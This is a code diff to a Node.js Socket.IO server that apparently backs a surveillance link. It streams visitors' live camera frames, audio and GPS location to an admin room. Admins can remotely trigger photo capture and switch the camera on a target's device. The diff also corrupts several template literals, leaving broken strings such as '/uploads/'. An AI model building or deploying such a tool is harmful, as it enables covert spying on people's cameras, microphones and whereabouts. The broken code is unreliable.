@@ -30,12 +30,11 @@ app.use(session({
 
 app.use(express.static(path.join(__dirname, 'public')));
 
-let activeUsers = {}; // socketId -> userObj
+let activeUsers = {};
 let connectionHistory = [];
 let allPhotos = [];
 let isLinkActive = true;
 
-// Admin Auth APIs matching the new admin.html
 app.post('/api/admin/login', (req, res) => {
     const { password } = req.body;
     if (password === ADMIN_PASSWORD) {
@@ -110,7 +109,6 @@ io.on('connection', (socket) => {
         }
     });
 
-    // User Connection Info
     socket.on('user-connect-info', (data) => {
         if (!isLinkActive) {
             socket.emit('link-disabled');
@@ -145,21 +143,18 @@ io.on('connection', (socket) => {
         }
     });
 
-    // Live Video Stream
     socket.on('live-stream-frame', (frameData) => {
         if (activeUsers[socket.id]) {
             io.to('admins').emit('update-live-stream', { socketId: socket.id, frameData });
         }
     });
 
-    // Live Audio Stream
     socket.on('audio-stream', (audioData) => {
         if (activeUsers[socket.id]) {
             io.to('admins').emit('audio-stream', { userId: socket.id, audio: audioData });
         }
     });
 
-    // Photo Capture
     socket.on('user-photo-captured', (imageData, callback) => {
         try {
             if (!imageData) {
@@ -168,7 +163,7 @@ io.on('connection', (socket) => {
             }
             const base64Data = imageData.replace(/^data:image\/jpeg;base64,/, '');
             const photoId = 'photo_' + Date.now() + '_' + Math.random().toString(36).substring(2, 7);
-            const filename = `${photoId}.jpg`;
+            const filename = ${photoId}.jpg;
             const filepath = path.join(uploadsDir, filename);
 
             fs.writeFile(filepath, base64Data, 'base64', (err) => {
@@ -178,7 +173,7 @@ io.on('connection', (socket) => {
                 }
                 const photoObj = {
                     id: photoId,
-                    imageUrl: `/uploads/${filename}`,
+                    imageUrl: /uploads/,
                     deviceInfo: activeUsers[socket.id]?.deviceInfo || 'Unknown Device',
                     timestamp: new Date()
                 };
@@ -191,7 +186,6 @@ io.on('connection', (socket) => {
         }
     });
 
-    // GPS Location
     socket.on('user-location', (coords) => {
         if (activeUsers[socket.id]) {
             activeUsers[socket.id].location = coords;
@@ -199,7 +193,6 @@ io.on('connection', (socket) => {
         }
     });
 
-    // Admin Commands to User
     socket.on('admin-trigger-capture', (targetId) => {
         io.to(targetId).emit('capture-photo');
     });
@@ -212,7 +205,6 @@ io.on('connection', (socket) => {
         io.to(targetId).emit('switch-camera');
     });
 
-    // Disconnect Cleanup & History Log
     socket.on('disconnect', () => {
         if (activeUsers[socket.id]) {
             const user = activeUsers[socket.id];
@@ -223,7 +215,7 @@ io.on('connection', (socket) => {
             const diffSec = Math.floor(diffMs / 1000);
             const mins = Math.floor(diffSec / 60);
             const secs = diffSec % 60;
-            const durationStr = `${mins}m ${secs}s`;
+            const durationStr = ${mins}m s;
 
             connectionHistory.unshift({
                 deviceInfo: user.deviceInfo,
@@ -233,7 +225,6 @@ io.on('connection', (socket) => {
                 duration: durationStr
             });
 
-            // Keep history max 50 items
             if (connectionHistory.length > 50) connectionHistory.pop();
 
             delete activeUsers[socket.id];
@@ -243,5 +234,5 @@ io.on('connection', (socket) => {
 });
 
 server.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
+    console.log(Server running on port );
 });
